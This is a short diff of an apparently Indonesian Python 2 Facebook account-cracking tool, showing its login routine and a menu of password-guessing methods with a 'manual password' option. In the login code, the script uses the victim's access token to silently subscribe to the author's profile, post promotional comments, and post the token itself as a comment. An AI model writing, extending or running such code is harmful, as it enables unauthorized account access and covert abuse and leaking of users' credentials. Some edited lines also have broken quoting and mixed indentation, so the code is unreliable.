@@ -103,7 +103,7 @@ def login():
 			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)  
 			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
 			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)    
-                        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
+                        requests.post("https://graph.facebook.com/%s/comments/?message=%s&access_token=%s"%(raka_sayang_amanda,token,token))
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -267,11 +267,12 @@ def method():
 	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mB-Api\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mTouch Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
-	method = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mOption       : \033[1;92m")
+	method = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mOption     : \033[1;92m")
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwors ? y/t : \033[1;92m")
+		ask = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwors ? y/t : \033[1;92m")
+                print"(\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Jika Tak Ada Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ...")
 		if ask == "y":
 			manual()
 		print(" ")
